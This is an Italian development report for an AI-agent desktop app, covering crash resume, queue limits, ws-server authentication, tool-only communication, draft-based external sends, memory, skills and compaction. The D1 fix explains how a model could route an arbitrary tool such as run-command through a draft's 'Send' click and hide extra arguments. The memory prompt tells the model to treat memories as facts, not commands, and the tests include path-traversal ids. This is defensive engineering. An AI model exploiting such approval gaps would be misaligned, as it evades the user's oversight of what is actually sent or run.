## R1 — Ripresa dopo crash/retry: l'agente RIPRENDE dal transcript, non ripete

- **`payload.entryId` sul job:** al primo tentativo `runTurn` aggiunge il messaggio utente (o il prompt della routine) e, PRIMA di chiamare il modello, registra l'id dell'entry nel payload del job (`setJobEntryId`); ai tentativi successivi quell'id torna a `runTurn` come `opts.resume` e il messaggio NON viene riscritto.
- **Riparazione pre-modello (`src/main/agent/resume.ts`, puro):** `planResume(entries, entryId)` decide — (a) ogni tool-call del turno senza tool-result riceve un tool-result PERSISTITO "interrotto da un riavvio: l'esito è sconosciuto. Verifica lo stato prima di ripetere azioni con effetti esterni."; (b) ogni approval ancora `pending` dell'agente viene marcata `expired` (entry aggiornata e riemessa alla UI); (c) notice visibile "Turno ripreso dopo un'interruzione". Poi il loop prosegue normalmente ricostruendo i messaggi con `buildMessages`: al modello arriva l'esito "sconosciuto" e decide lui se verificare prima di ripetere azioni con effetti esterni.
- **Turno già concluso:** se l'ultimo entry dopo `entryId` è un messaggio assistant finale (con testo, nessuna tool-call dopo), il job viene completato SENZA chiamare il modello.
- Vale per `user-message` e `routine-run`: la mappa job→turno vive in `src/daemon/run-job.ts` (`makeJobRunner`, usato da `index.ts`; `runTurn` iniettabile per i test).
- Test: blocco R1 in `loop.test.ts` con LLM finto e sandbox finto che conta le esecuzioni (crash simulato con transcript post-crash: UN solo messaggio utente, tool-result sintetico, approval expired, tool mai rieseguito, turno concluso → zero chiamate al modello) + `planResume` puro in `resume.test.ts` + wiring entryId→resume in `run-job.test.ts`.

## R2 — Coda piena: il messaggio NON viene accodato

`enqueueUserMessage` ora restituisce `Job | null`: oltre il tetto (10) scrive la notice "Coda piena: messaggio scartato." e torna `null` SENZA creare il job (prima la notice era scritta ma `enqueueJob` girava comunque). Test: all'undicesimo messaggio con l'agente occupato il numero di righe nella tabella jobs non aumenta e la chiamata torna `null`.

## R3 — File del token: nasce già 0600, con rename atomico

`writePrivateFileSync` (usata da `writeDaemonInfo` e `acquireDaemonLock`): file temporaneo `<nome>.tmp` nella stessa directory creato con `{ mode: 0o600 }` + `renameSync` sopra la destinazione. Il token non è mai leggibile ad altri utenti nemmeno per l'istante tra write e chmod di prima; il lock ora è 0600 anch'esso (prima 0644). Test: file finale 0600, nessun residuo temporaneo, e il rename avviene da un temp già 0600 (osservato intercettando `renameSync`).

## R4 — Connessioni non autenticate sul ws-server

- Niente hello valido entro **5 secondi** → chiusura con **4001** (timer per connessione, cancellato all'autenticazione).
- Prima dell'autenticazione la dimensione totale accumulata (buffer + frammenti) non può superare **64 KB** → chiusura con **1009**; dopo l'hello resta il limite attuale sui frame (10 MB), verificato dal test.
- Due aggiustamenti necessari ai test (e correttezza in sé): (1) `close()` ora termina la socket senza `destroy()` immediato, così il close frame arriva davvero al client (prima poteva essere perso nel reset); (2) i byte consegnati da node con l'evento `upgrade` (`head`, cioè i frame arrivati nello stesso segmento TCP della richiesta) ora vengono alimentati alla connessione — prima venivano scartati (invisibile in produzione perché il client dell'app invia l'hello solo dopo il 101).
- Test su socket reali di loopback: timeout senza hello → 4001; frammenti oltre 64 KB pre-hello → 1009; hello valido + frame di 70 KB post-auth → risposta RPC, nessuna chiusura.

## REPORT CORREZIONI FASE 2

- **File modificati:** `src/main/agent/resume.ts` (nuovo, piano di ripresa puro), `src/main/agent/loop.ts` (opzioni `resume`/`onTurnEntry`, riparazione pre-modello, completamento senza modello), `src/main/store/jobs.ts` (`setJobEntryId`), `src/daemon/run-job.ts` (nuovo, `makeJobRunner`), `src/daemon/index.ts` (usa il runner), `src/daemon/enqueue.ts` (R2), `src/daemon/daemon-files.ts` (R3), `src/daemon/ws-server.ts` (R4); test: `src/main/agent/__tests__/loop.test.ts` (blocco R1), `src/main/agent/__tests__/resume.test.ts` (nuovo), `src/daemon/__tests__/run-job.test.ts` (nuovo), `src/daemon/__tests__/queue.test.ts` (R2), `src/daemon/__tests__/daemon-files.test.ts` (nuovo), `src/daemon/__tests__/ws-server.test.ts` (nuovo); `REPORT.md`.
- **Decisioni:** (1) la logica di ripresa è una funzione pura (`planResume`) e chi la applica è `runTurn`: niente effetti nascosti nel modulo puro, il loop resta l'unico a scrivere il transcript; (2) anche una tool-call negata dai permessi (notice `denied`, nessun tool-result nel transcript) riceve il result sintetico: vale la lettera della review ("ogni tool-call senza tool-result") e per `buildMessages` la coppia resta coerente; (3) la finestra appendEntry→`setJobEntryId` non è transazionale: un crash esattamente tra le due chiamate può ancora duplicare il messaggio (vedi fuori scope); (4) `enqueueUserMessage` → `Job | null`: `chat:send` in `api.ts` ignora il valore di ritorno, la notice "Coda piena" è già emessa al transcript; (5) i limiti del ws-server (`authTimeoutMs`, `preAuthMaxBytes`) sono parametri solo per i test, i default in produzione sono 5 s e 64 KB; (6) il tetto pre-auth è sulla somma buffer+frammenti a ogni byte ricevuto (i ping pre-auth vengono risposti ma consumati dal buffer: a chiudere quelli è il timeout da 5 s).
- **Output typecheck/vitest/build:** `npm run typecheck` → `tsc --noEmit` pulito (exit 0); `npx vitest run` → `Test Files 19 passed (19)` / `Tests 198 passed (198)`; `npm run build` → `✓ built` ×3, `out/main/index.js 18.20 kB`, `out/main/daemon.js 96.84 kB`, preload 2.67 kB, renderer 1.179,95 kB (avvisi `INEFFECTIVE_DYNAMIC_IMPORT` preesistenti, cosmetici).
- **Non verificato:** (1) la ripresa dal vivo con un crash REALE del daemon a metà turno (verificata a livello di loop con transcript post-crash e runner finti, più il wiring `makeJobRunner`; nessun `npm run dev` con kill -9 in questa ripassata); (2) i test ws usano frame non mascherati (il codec li accetta): il percorso mascherato client→server resta coperto dai test del codec in `rpc-protocol.test.ts`; (3) il pacchetto `dist`/dmg, invariato rispetto alla fase 2.
- **Fuori scope notati:** (1) la registrazione dell'entry non è atomica con l'append del messaggio: un crash nella finestra tra le due scritture può duplicare il messaggio utente al retry (servirebbe una transazione SQLite condivisa tra transcript e payload del job); (2) la detection "turno già concluso" guarda l'ultimo entry dopo `entryId`: se dopo la risposta finale arrivano notice (es. "messaggio in coda") il turno completo viene ripreso chiamando comunque il modello — raro ed esito comunque corretto, solo una chiamata in più; (3) `node-cron` ancora in package.json e avvisi rollup (già notati in fase 2, invariati); (4) il ws-server risponde ai PING anche pre-autenticazione (innocuo: il timeout chiude comunque entro 5 s).

---

# Fase 3 — L'agente comunica solo tramite tool

**Data:** 2026-10-26 · **Commit:** `fase 3: comunicazione via tool` · **Tag:** `fase-3`
**Scope:** §3bis L2 (solo tool parlanti), L5 (drafting/invii esterni), L10 (widget) + §3ter T2/T3/T5 (evidenza e catalogo); prima del resto i residui fase 2 (commit `fase 3: residui`).
**Verifica:** `npm run typecheck` pulito · `npx vitest run` **239 test, 22 file, tutti verdi** (206 post-residui + 33 nuovi) · `npm run build` verde · chat verificata dal vivo con `npm run dev` (vedi sotto).

## Residui fase 2 (commit separato `fase 3: residui`)

- **Entry assistant vuote:** `history.ts` scarta i messaggi assistant con contenuto vuoto/solo spazi (stream interrotto da crash/errore del modello); una tool-call seguente si aggrega da sola in un assistant con sole chiamate. Nell'adapter Anthropic la conversione è estratta in `toAnthropicMessages` (pura, esportata, testata): mai blocchi `text` vuoti o di soli spazi — un assistant con sole tool call ha solo blocchi `tool_use`, un messaggio che resterebbe senza blocchi viene scartato.
- **Recupero lease all'avvio:** `requeueAllLeased` in `jobs.ts` rimette subito in `queued` TUTTI i job `leased` (il lock garantisce un solo daemon per directory dati: ogni lease appartiene a un processo morto), chiamata in `index.ts` prima di `worker.start()` — niente attesa dei 2 minuti di lease.

## Il principio (§3bis L2)

Il testo libero generato dal modello NON arriva più all'utente: viene salvato come entry `thinking` (nascosta di default in chat, toggle "🧠 Ragionamento" nell'header). L'agente parla SOLE tramite tre tool gestiti dal loop, sempre consentiti (regole `always_allow` di default in `db.ts`, ma il loop li intercetta PRIMA del gate: non hanno effetti fuori dal transcript):

- **`send_to_user({text, urgent?})`** → entry `send-message` con `message.type='text'`. Chiamabile più volte in un turno (avanzamento + risultato). `urgent` finisce in `meta.message.urgent` (per la fase 6).
- **`ask_user({prompt, helpText?, options, multiSelect?, allowCustom?, dismissOnMoveOn?})`** → entry `send-message` widget e il turno TERMINA con esito `AWAITING_USER`. La risposta dell'utente torna come nuovo messaggio utente con `meta.respondedTo=<entryId>` e il widget salva `respondedValue`; se l'utente scrive altro e il widget ha `dismissOnMoveOn`, viene marcato `widgetDismissed` (al momento dell'accodamento, `enqueue.ts`).
- **`draft_external({channel, to, subject?, body, via?})`** → entry `send-message` draft con pulsanti Invia/Scarta/Modifica (`meta.status`: `pending → sent | discarded | error`). L'invio vero avviene SOLO al click: la RPC `draft:send` esegue `via.tool` con `via.args` passando dal gate dei permessi e il risultato diventa una notice nel transcript.

Le chiamate del modello successive a una `ask_user` nella stessa risposta non vengono eseguite (il turno termina lì).

## Esito del turno (entry `event` con `meta.turnEnd`)

`FINISHED | STOPPED | SUPERSEDED | AWAITING_USER` salvato in un'entry event alla chiusura di OGNI turno:

- **FINISHED** — completamento normale. Se un turno **utente** finisce senza nessuna `send-message` visibile (`visibleReplyEntries` in `history.ts`, pura), il runtime fa **UNA chiamata di recupero** con un sollecito dedicato (`RECOVERY_NUDGE`); se anche quella non produce `send_to_user`, il testo libero dell'ultima risposta viene mostrato come send-message con `meta.fallback=true`. I turni **routine** non fanno recupero: possono finire in silenzio.
- **AWAITING_USER** — dopo `ask_user` (nessuna chiamata di recupero: la palla è dell'utente).
- **SUPERSEDED** — se arriva un messaggio utente mentre l'agente è in `paused-for-approval`, `supersedeIfPaused` (loop) marca le approval pendenti `superseded`, abortisce il turno e `enqueueUserMessage` fa partire il nuovo messaggio subito invece di metterlo in coda. "In attesa di un ask_user" non serve gestione: `ask_user` TERMINA il turno, quindi l'agente è già libero e il messaggio parte comunque subito.
- **STOPPED** — interrupt dell'utente, errore del modello, risposta vuota o limite di passi (bug preesistente corretto: prima l'abort mostrava la notice "limite di passi raggiunto").

## Classificazione degli invii esterni (§3bis L5)

Setting `externalSendTools` (mappa server-slug → nomi tool originali, default: gmail → send_message/reply/forward/send_email/send_draft; slack → slack_send_message/slack_schedule_message; la config utente sostituisce le default). `external-send.ts` (puro, testato): una chiamata diretta del modello a uno di questi tool MCP NON viene eseguita — diventa automaticamente una **bozza** (`draftFromExternalCall`: to/subject/body best-effort dai nomi di argomento comuni, `via` = la chiamata originale, canale dedotto dal server) e al modello torna "Invio esterno non eseguito: trasformato in una bozza in attesa della conferma dell'utente". Il tool MCP viene eseguito solo da `draft:send` al click dell'utente.

## History per il modello (§3bis L2)

`buildMessages` ricostruisce dal transcript: le entry `send-message` tornano come **tool call + tool result** (con `meta.call` la chiamata ORIGINALE — es. `mcp__gmail__send_message` — così il modello ricorda esattamente cosa ha fatto; il result dice come è finita: "inviato all'utente", "l'utente ha risposto: …", "bozza scartata dall'utente"…); le entry `thinking` tornano come contenuto assistant. Gli id delle call ricostruite sono `send_<entryId>` (univoci e deterministici); il pairing call/result resta coerente per `repairToolPairs`.

## UI e RPC

- **WidgetCard** (opzioni come bottoni, `style:'primary'`, multiSelect con conferma, campo libero se `allowCustom`, stato "✓ Hai risposto: …"/"scartato") e **DraftCard** (anteprima canale/destinatario/oggetto/body, Invia/Scarta/Modifica con editing inline persistito via `draft:update`) in `src/renderer/src/components/`.
- Le RPC nuove (`widget:respond`, `draft:send`, `draft:discard`, `draft:update`) passano dal daemon come le altre (canali in `ipc.ts`, metodi in `api.ts`, binding in `preload`).
- Il testo libero è visibile solo col toggle "🧠 Ragionamento" (insieme agli event di fine turno, che sono contabilità interna); la notifica "bot ha risposto" e il contesto quick-ask leggono ora le `send-message` (con ripiego sulle `message` assistant pre-fase 3).

## Ripresa dopo crash (R1, aggiornata)

`planResume` considera il turno "già concluso" anche se esiste un evento `meta.turnEnd` dopo l'entry di apertura (transcript di fase 3); il completamento senza modello non duplica l'evento se c'è già.

## Verifica manuale (`npm run dev`, agente "Bot" su Ollama `gemma4:31b-cloud`)

1. **Risposta con send_to_user:** "Ciao! Presentati in una riga." → entry `thinking` (vuota) + `send-message` "Ciao! Sono il tuo assistente personale sempre attivo." (call `send_to_user`) + event `FINISHED`. Nessuna chiamata di recupero (il tool era stato usato).
2. **Widget:** "Fammi una domanda a opzioni…" → widget "Cosa preferisci bere?" (Tè/Caffè) + event `AWAITING_USER`. Click su "Caffè" via RPC `widget:respond` → `respondedValue` sul widget, messaggio utente "Caffè" con `meta.respondedTo`, risposta "Ottima scelta! Il caffè è un classico." via `send_to_user`, `FINISHED`.
3. **UI vera:** messaggio scritto e inviato dal campo input dell'app (typing reale via computer use) → arrivato al daemon, widget "Domani dove lavorerai?" (Ufficio/Casa) **renderizzato nella finestra** con i due bottoni (verificato da screenshot analizzato) e comparso via eventi push. Il bottone chiama la stessa catena del punto 2 (stessa action store → stessa RPC).
4. Daemon spento con SIGTERM: `daemon.json` e lock rimossi correttamente.

Nota: nel transcript di sviluppo dell'app restano le voci di questi test (entry 126–146), come era già successo per il PONG della fase 2.

## REPORT FASE 3

- **File modificati/creati:**
  - `src/main/agent/external-send.ts` — **nuovo** — classificazione invii esterni (puro): `isExternalSend`, `draftFromExternalCall`, default gmail/slack.
  - `src/main/agent/widgets.ts` — **nuovo** — helper widget puri: `findDismissibleWidgets`, `responseDisplayText`, `normalizeOptions`, `widgetPayload`.
  - `src/renderer/src/components/WidgetCard.tsx`, `DraftCard.tsx` — **nuovi** — card widget (opzioni/multiSelect/custom/stato) e bozza (Invia/Scarta/Modifica con editing inline).
  - `src/main/agent/loop.ts` — il cuore: thinking al posto del testo libero, gestione loop dei tre tool, esito `turnEnd`, chiamata di recupero + fallback, `supersedeIfPaused`, `dismissPendingWidgets`, tool result "bozza" per gli invii esterni intercettati.
  - `src/main/agent/history.ts` — send-message → tool call + result (meta.call), thinking → assistant, `visibleReplyEntries` (messaggi visibili), scarto assistant vuoti (residuo 2a).
  - `src/main/agent/llm.ts` — `toAnthropicMessages` pura senza blocchi text vuoti (residuo 2a).
  - `src/main/agent/tools.ts` — definizioni di send_to_user / ask_user / draft_external.
  - `src/main/agent/prompts.ts` — regole di comunicazione (solo tool, avanzamento, opzioni cliccabili, silenzio nelle routine, mai dettagli interni, invii via bozza).
  - `src/main/agent/resume.ts` — alreadyComplete anche con event turnEnd.
  - `src/shared/types.ts` — kind `send-message`/`thinking`, `TurnEnd`, payload text/widget/draft, `respondedValue`/`widgetDismissed`, API widget/bozze.
  - `src/main/store/jobs.ts` + `src/daemon/index.ts` — `requeueAllLeased` all'avvio (residuo 2b).
  - `src/main/store/db.ts` — regole always_allow di default per i tre tool di comunicazione.
  - `src/daemon/enqueue.ts` — supersede dei turni in approval, dismissal widget, `enqueueWidgetResponse` (respondedTo + testo leggibile).
  - `src/daemon/run-job.ts` — pass-through `respondedTo` al loop.
  - `src/daemon/api.ts` — RPC `widget:respond`/`draft:send`/`draft:discard`/`draft:update` (gate sull'invio, esito come notice), contesto quick-ask sulle send-message.
  - `src/main/ipc.ts`, `src/preload/index.ts`, `src/renderer/src/store.ts`, `src/renderer/src/components/Chat.tsx` — canali, binding, azioni store, rendering nuovi kind + toggle ragionamento.
  - test: **nuovi** `external-send.test.ts`, `widgets.test.ts`, `draft-actions.test.ts`; aggiornati `loop.test.ts` (7 nuovi), `history.test.ts` (6 nuovi), `jobs.test.ts`, `llm-toolcalls.test.ts` (residui), `queue.test.ts` (3 nuovi widget).
- **Decisioni prese e perché:** (1) i tool di comunicazione sono intercettati nel loop PRIMA del gate (oltre che always_allow nelle regole di default): non hanno effetti fuori dal transcript e il gate non deve poter bloccare la parola; (2) per `draft:send` il click su Invia conta come consenso dell'utente (ha visto tutto il contenuto della bozza), ma una regola `blocked` nega comunque — è la semantica della DraftCard dell'originale ("Send / Discard / Always send"); (3) la chiamata di recupero NON è persistita nel transcript (il sollecito è un messaggio utente solo in memoria): al turno successivo la storia ricostruita resta pulita; (4) il fallback usa il testo dell'ultima risposta (recupero incluso) e se non c'è testo la fine resta silenziosa; (5) il widget rispondibile invia COME messaggio utente le etichette leggibili (`responseDisplayText`), non i value tecnici; (6) gli event turnEnd non vengono renderizzati (visibili solo col toggle ragionamento): le routine restano letteralmente silenziose in chat; (7) chiamate successive a ask_user nella stessa risposta del modello non vengono eseguite: il turno termina alla domanda, il prompt dice al modello di non ripetere la domanda; (8) le entry send-message non hanno entry tool-call/tool-result separate nel transcript (la coppia vive in `meta.call` + conversione in buildMessages): la chat resta pulita.
- **Deviazioni dal prompt e perché:** (1) "in attesa di un ask_user" per SUPERSEDED non richiede codice dedicato: ask_user TERMINA il turno (come da specifica), quindi all'arrivo del messaggio l'agente è già libero e la coda jobs lo fa partire subito — SUPERSEDED serve solo per paused-for-approval; (2) il testo "TURN_END_LABELS" è in italiano negli event (coerente con le notice esistenti); (3) aggiunte RPC `draft:update` (persistere il body modificato senza inviare) e meta.status `error` sulle bozze con invio fallito (riprovabile): servite dall'editing inline richiesto; (4) i residui fase 2 in un commit separato come da convenzione delle fasi precedenti.
- **Output di typecheck / vitest / build (ultime righe):** `tsc --noEmit` pulito (exit 0); vitest `Test Files 22 passed (22)` / `Tests 239 passed (239)`; build `out/main/index.js 18.30 kB`, `out/main/daemon.js 120.71 kB`, preload `3.07 kB`, renderer `1.191,64 kB`, `✓ built` ×3.
- **Cosa NON è stato verificato:** (1) il **click fisico** sul bottone del widget nella finestra: i click sintetizzati di computer-use non raggiungono in modo affidabile i bottoni DOM di Electron (tre tentativi con coordinate derivate dall'analisi dello screenshot, incluse bounding box su crop; l'input di testo invece funziona). La catena dietro il bottone è verificata per intero: rendering della card con i bottoni (screenshot), action store → RPC `widget:respond` dal vivo con modello reale, `respondedValue`/`respondedTo`/turno di risposta nel transcript, più i test; (2) il rendering visivo di DraftCard non è stato visto dal vivo (nessuna bozza generata nella sessione: nessun server MCP gmail/slack configurato in dev) — logica verificata da `draft-actions.test.ts` su DB reale con gate e tool MCP finti; (3) il percorso impacchettato dist/dmg (invariato rispetto alla fase 2); (4) una routine reale silenziata dal vivo (il comportamento è coperto dal test loop con LLM finto, nessuna routine schedulata in dev).
- **Problemi fuori scope notati:** (1) il ws-server accetta UNA sola UI: la seconda connessione calcia la prima e alla riconnessione NON c'è catch-up del transcript — during la verifica i client di probe lasciavano la finestra con la chat ferma al contenuto pre-kick finché non si ri-seleziona l'agente (andrebbe fatto un re-fetch delle entries alla riconnessione); (2) l'interrupt durante un'approval attende comunque il timeout dell'approval (`interrupt` abortisce lo stream ma la promise dell'approval resta appesa; preesistente); (3) le entry pre-fase 3 (assistant `message`) restano visibili come prima — nessuna migrazione del transcript storico; (4) il modello gemma4 risponde a volte con thinking "empty" letterale (contenuto della entry) — innocuo, resta nascosto; (5) `node-cron` inutilizzato e avvisi rollup (invariati dalle fasi precedenti).

# Correzioni review fase 3

**Data:** 2026-10-26 · **Commit:** `fase 3: correzioni review` · **Tag:** `fase-3` (spostato)
**Scope:** unico punto D1 della review — bozze: "ciò che l'utente vede è esattamente ciò che viene inviato". Nient'altro è stato toccato.

## D1 — Bozze: canale di invio, campo nascosti, modifica coerente

Prima della correzione `draft_external` accettava dal modello un `via: {tool, args}` arbitrario: `via.tool` poteva essere `run-command` (o qualunque tool MCP) e in `draft:send` il verdetto "ask" del gate era trattato come consenso — il click su "Invia" eseguiva quel tool. Inoltre la card mostrava `message.to/subject/body` mentre veniva eseguito `via.args`, che poteva contenere destinatari/testi/campi diversi, e "Modifica" aggiornava solo `message.body`.

Correzione (logica pura in `external-send.ts`: `prepareDraft`, `draftPayloadFromVia`, `fieldMapForArgs`, `applyDraftBody`):

1. **Solo tool di invio.** Una bozza ha un `via` SOLO se `via.tool` è un invio esterno secondo `externalSendTools` (`isExternalSend`). Dal modello (`draft_external` in `loop.ts`) un `via` non di invio viene scartato: la bozza resta solo testo (Invia disabilitato in card con "nessun canale di invio collegato") e al modello torna una tool-result che lo spiega. In `draft:send` (`api.ts`) qualunque `via.tool` non di invio viene rifiutato prima del gate — difesa in profondità che copre anche le bozze salvate nel DB prima della correzione. Il verdetto "ask" del gate vale quindi come consenso SOLO per tool di invio esterno; "deny" blocca sempre.
2. **Mappa dei campi.** Per ogni bozza con via si calcola alla creazione una `fieldMap {to?, subject?, body?}` ( stessi nomi comuni di `draftFromExternalCall`: to/recipient/recipients/email/user/channel, subject/title, body/text/message/content). I campi to/subject/body passati dal modello vengono scritti DENTRO `via.args` secondo la fieldMap e il payload li rilegge da lì: un'unica fonte di verità, gli argomenti che verranno inviati.
3. **Nessun campo nascosto.** Gli argomenti di `via.args` non coperti dalla fieldMap (bcc, cc, thread_id, allegati…) finiscono in `extraArgs`, mostrati dalla DraftCard in una sezione "Altri parametri" sempre visibile e non collassata (quando non vuota).
4. **Modifica coerente.** `draft:update` e il body inline passato a `draft:send` aggiornano `via.args[fieldMap.body]` oltre a `message.body` (`applyDraftBody`; per le bozze vecchie senza fieldMap la mappa si ricalcola dagli argomenti). Se la fieldMap non ha un campo body (nomi di argomento sconosciuti) il payload porta `bodyLocked: true`: modifica del testo disabilitata in card e corpo di ripiego sul JSON grezzo degli argomenti (tutti visibili in "Altri parametri").
5. **Esecuzione esatta.** In `draft:send` si eseguono esattamente gli argomenti salvati e mostrati (`via.args` aggiornato).

La `DraftCard` segue il payload: "Altri parametri" da `extraArgs`, niente body/Modifica con `bodyLocked`, Invia disabilitato con spiegazione quando non c'è `via`.

## REPORT CORREZIONI FASE 3

- **File modificati:** `src/shared/types.ts` (DraftFieldMap/DraftExtraArg + payload draft con fieldMap/extraArgs/bodyLocked); `src/main/agent/external-send.ts` (prepareDraft/fieldMapForArgs/applyDraftBody, draftFromExternalCall rifattorizzato sulla stessa via); `src/main/agent/loop.ts` (draft_external → prepareDraft, tool-result di scarto); `src/daemon/api.ts` (draft:send rifiuta via non di invio, update/send scrivono via.args); `src/renderer/src/components/DraftCard.tsx` (Altri parametri, bodyLocked, Invia disabilitato senza canale); test: `external-send.test.ts` (+9), `loop.test.ts` (+2), `draft-actions.test.ts` (+4, di cui 1 aspettativa aggiornata).
- **Decisioni:** (1) i test D1 sono stati scritti PRIMA della correzione e verificati in fail (17 fail su 3 file), poi ri-verificati in pass; (2) due aspettative esistenti sono state aggiornate perché sancivano il comportamento buggato: il test "click su Invia" di draft-actions affermava che il tool ricevesse il body ORIGINALE mentre la card mostrava quello modificato (è il bug b), e il toEqual di draftFromExternalCall ora include fieldMap/extraArgs nel payload; (3) la fieldMap si calcola dai soli argomenti con valore leggibile (stringa/array non vuoti, stessa semantica del vecchio `first()`), così i valori non leggibili restano visibili come argomenti grezzi invece di sparire; (4) in `applyDraftBody` la fieldMap delle bozze vecchie si ricalcola al volo (best-effort), senza migrazione del DB.
- **Output typecheck/vitest/build:** `tsc --noEmit` pulito (exit 0); vitest `Test Files 22 passed (22)` / `Tests 254 passed (254)`; build `✓ built` ×3, `out/main/index.js 18.30 kB`, `out/main/daemon.js 124.92 kB`, preload `3.07 kB`, renderer `1.192,80 kB`.
- **Non verificato:** il rendering visivo della DraftCard dal vivo (nessun server MCP gmail/slack in dev, come per la fase 3: la card è verificata a livello di payload + typecheck); il percorso dist/dmg (invariato).
- **Fuori scope notati:** nessuno di nuovo — valgono i cinque punti "fuori scope" della fase 3 (ws-server mono-client senza catch-up, interrupt che attende il timeout dell'approval, transcript pre-fase 3 non migrato, thinking "empty" di gemma4, node-cron inutilizzato e avvisi rollup).

# Fase 4 — Memoria, skill, compaction, update_state

**Data:** 2026-10-26 · **Commit:** `fase 4: memoria, skill, compaction` · **Tag:** `fase-4`
**Scope:** §3bis L6 (memoria e apprendimento) + compaction della history + update_state (§3ter T4/T5); prima del resto i residui (commit `fase 4: residui`).
**Verifica:** `npm run typecheck` pulito · `npx vitest run` **315 test, 28 file, tutti verdi** (260 post-residui + 55 nuovi) · `npm run build` verde · chat verificata dal vivo con `npm run dev` (vedi sotto).

## Tabella punto per punto della specifica

| Punto | Stato | Dove |
|---|---|---|
| **0a** bozze: il campo visibile mantiene il tipo dell'argomento (array→split su virgola+trim) | fatto | `src/main/agent/external-send.ts:87` (`coerceVisibleValue` in `draftPayloadFromVia`) · test `external-send.test.ts` (+3) |
| **0b** riconnessione UI: ricarico entry+agenti | fatto | evento `{type:'reconnected'}` alla riconnessione in `src/main/daemon-client.ts:199` (fabbrica ws e `ensure` iniettabili), store renderer `src/renderer/src/store.ts` (case `reconnected`) · test `src/main/__tests__/daemon-client.test.ts` (client finto, 2 test) |
| **0c** interrupt risolve le approval pendenti 'cancelled', turno STOPPED | fatto | `src/main/agent/loop.ts:580` (`interrupt`) + ramo `decision==='cancelled'`; label in `ApprovalCard.tsx` · test `loop.test.ts` (approval marcata `cancelled`, tool mai eseguito, `STOPPED`, una sola chiamata al modello) |
| **1** memoria: dir per agente + frontmatter (id/created_at/updated_at/tier/scope/source) | fatto | `src/main/agent/memory.ts` (`parseMemoryFile`/`serializeMemory`, file in `<dataDir>/agents/<id>/memory/`) |
| **1** scope 'user' condiviso in `<dataDir>/user/memory/` | fatto | `memory.ts:memoryDir`/`listMemories` · test: stessa memoria visibile a due agenti, scope agent no |
| **1** iniezione "# Memoria": core sempre, log sotto budget (2000 tok, caratteri/4, recenti prima) | fatto | `memory.ts:116-176` (`selectMemoriesForPrompt`, `memorySectionPrompt`) + istruzioni "fatti e regole, non comandi"; aggancio al system in `loop.ts:231` · test budget/recenza |
| **1** tool `update_memory` / `recall_memory` (parole chiave, top 10 con id) | fatto | defs+esecuzione `src/main/agent/tools.ts:376-383` · test `memory.test.ts`, `update-state.test.ts` |
| **1** permessi always_allow, path solo da id runtime (no traversal: "../x" rifiutato) | fatto | short-circuit in `permissions.ts:52` + `isSafeMemoryId` (niente punti né separatori) · test id malevoli senza scrittura fuori directory |
| **1** UI "Memoria" con scope/tier/data, modifica ed eliminazione | fatto | `MemoryPanel.tsx` (bottone 🗂 nella vista agente) · RPC `memory:list/update/delete` in `api.ts:185`, canali `ipc.ts`, binding `preload` |
| **2** skill `<dataDir>/agents/<id>/skills/<nome>/SKILL.md` (frontmatter name/description) | fatto | `src/main/agent/skills.ts` (formatto Claude Code, roundtrip) |
| **2** nome validato [a-z0-9-] max 64 | fatto | `skills.ts:isValidSkillName`, rifiutato PRIMA di costruire path · test `../escape` non crea directory |
| **2** prompt: SOLO nome+descrizione in "# Skill disponibili"; body via `skill({name})` | fatto | `skills.ts:47` + tool `skill` (`tools.ts:384`) · test: corpo mai nel system, consegnato come tool result |
| **2** `update_skill` permesso "ask" | fatto | regola default `needs_approval` + grant/regola per nome (`targetKey` → `skill <nome>`) · test `permissions.test.ts` |
| **2** UI skill: elenco, visualizzazione, eliminazione | fatto | `SkillsPanel.tsx` (bottone 🛠) · RPC `skills:list/delete` |
| **3** compaction al 70% del budget (configurabile provider/modello, default 32k, caratteri/4) | fatto | `src/main/agent/compaction.ts:38` (`planCompaction`) + `maybeCompactHistory` (budget da setting `contextBudgetTokens["<provider>/<model>"]`) · chiamata in `loop.ts:222` |
| **3** entry kind 'summary' con LLM dedicata (fatti, decisioni, task, preferenze) e `meta.coversUpTo` | fatto | prompt `secondaryPrompts.compaction`; `buildMessages` sostituisce i turni coperti (`history.ts:170`), entry RESTANO nel DB · test soglia/sostituzione/coppie tool |
| **3** mai a metà turno (confine = messaggio utente), fallback se il riassunto fallisce | fatto | confine in `planCompaction` (suffix parte sempre da un user message); errore LLM → NESSUN summary, il turno prosegue col trim esistente · test LLM finto che fallisce |
| **3** summary visibile solo col toggle ragionamento | fatto | `EntryKind 'summary'` + case in `Chat.tsx` (come thinking) |
| **4** `update_state` target memory (write/update/delete = update_memory) | fatto | `tools.ts:399` → `runMemoryAction` condivisa |
| **4** target routine (create/update/pause/resume/delete; name, description, prompt, schedule, timezone; cron via `parseCron`) | fatto | `tools.ts:260` (`runRoutineAction`) · test: cron non valido → "Schedule non valida … 0 9 * * *" al modello |
| **4** routine dell'agente SEMPRE in pausa + provenance 'agent' (colonna nuova, default 'user') | fatto | `createRoutine` con `enabled:0, provenance:'agent'`; colonna+migrazione ALTER in `db.ts:78-92` · test `update-state.test.ts` + live |
| **4** resume e update di schedule/prompt su routine attiva = "ask" (card con nome, schedule in linguaggio naturale, prompt); create/pause/delete allow | fatto | verdetto puro `update-state.ts:38`, gate `permissions.ts:59` (standing grant per routine); `describeCron` in `src/shared/cron-human.ts`; card dedicata in `ApprovalCard.tsx` · test verdetto+gate+card, live |
| **4** evento `meta.automation {action,id,name}` per ogni azione su routine | fatto | scritto dal loop dopo l'esecuzione (`loop.ts`, `automationEventText`) · test + live ("Routine creata (in pausa): …", "Routine attivata: …") |
| **5** test di tutte le aree | fatto | 8 file nuovi/estesi: `memory.test.ts` (13), `skills.test.ts` (7), `compaction.test.ts` (10), `update-state.test.ts` (10), `cron-human.test.ts` (3), `daemon-client.test.ts` (2), `loop.test.ts` (+7), `permissions.test.ts` (+5), `external-send.test.ts` (+3) |

## Verifica manuale (`npm run dev`, agente "Bot", provider Ollama)

Nota: il modello configurato (`gemma4:31b-cloud`) non risponde più su Ollama; per i test switchato temporaneamente a `glm-5.3-flash:cloud` prima e `gpt-oss:120b-cloud` poi (il primo annidava le tool call dentro il testo di send_to_user), **ripristinato** `gemma4:31b-cloud` a fine verifica.

1. **Memoria scritta dal bot:** "ricorda che mi chiamo Fabio e che voglio sempre risposte in italiano" → `update_memory` (tool-call nel transcript) → file `agents/agent_03df9594/memory/mem_d8b49e35c9ab.md` (tier core, scope agent) e la memoria compare in `memory:list` (la stessa lista che alimenta il pannello 🗂 Memoria).
2. **Memoria usata in un turno nuovo:** "come mi chiamo e in che lingua ti ho chiesto di rispondermi?" → send_to_user "Ti chiami Fabio e mi hai chiesto di rispondere in italiano."
